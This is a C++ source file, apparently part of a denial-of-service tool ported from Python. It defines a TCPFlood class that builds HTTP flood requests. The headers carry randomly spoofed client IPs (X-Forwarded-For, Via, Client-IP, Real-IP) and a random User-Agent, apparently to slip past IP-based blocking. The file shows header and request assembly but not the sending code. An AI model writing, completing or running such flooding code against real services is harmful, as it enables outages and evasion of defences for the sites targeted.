#include "../include/TCPFlood.h"

TCPFlood::TCPFlood(string address, uint16_t port)
	: Flood(address, port)
	, request("")
	, header("")
	, defaultHeader("") // for case if the code below will fail
{
	// TODO: find out parsing similar to Python's YARL
	// compile default header
	
	// TODO: this rnd is damn slow, find a better implementation
	
	// this one is not thread safe and have to bve called only once at the beginning of a program
	// srand(time(0)); // init seed
	
	string ip = to_string(rand()%255)+'.'
		+ to_string(rand()%255)+'.'
		+ to_string(rand()%255)+'.'
		+ to_string(rand()%255); //   ip: str = Tools.rand_ipv4()
    
    string origin = "111.222.333.444"; //    origin = str(self._url.origin())
    string raw_authority = "111.111.111.111"; // self._url.raw_authority
    string user_agent =  USERAGENTS[rand() % USERAGENTS.size()];
    
    this->defaultHeader = TCPHeaderBase
		+ "Host: " + raw_authority + rn
        + "Origin: " + origin + rn
        + "Referer: " + origin + rn // emulate Referrer-Policy: origin
        + "User-Agent: " + user_agent + rn
        + "X-Forwarded-Host: " + raw_authority + rn
        + "Via: " + ip + rn
        + "Client-IP: " + ip + rn
        + "X-Forwarded-Proto: " + "https" + rn
        + "X-Forwarded-For: "+ ip + rn
        + "Real-IP: " + ip
    ;
}

const string& TCPFlood::getHeader() const { return this->header; }

const string& TCPFlood::getRequest() const { return this->request; }

const string& TCPFlood::getDefaultHeader() const { return this->defaultHeader; }

void TCPFlood::createRequest(RequestType reqestType, const string& qsPathRaw, const string& body)
{
	// method is unsafe because assumes header is already created and request type is valid
	this->request += RequestTypeStr.at(reqestType);
	this->request += " ";
	this->request += qsPathRaw;
	this->request += " HTTP/1.1" + rn;
	this->request += this->header;
	this->request += rn + rn;
	this->request += body;
}


void TCPFlood::setHeader(const string& headers)
{
		this->header = headers;
}
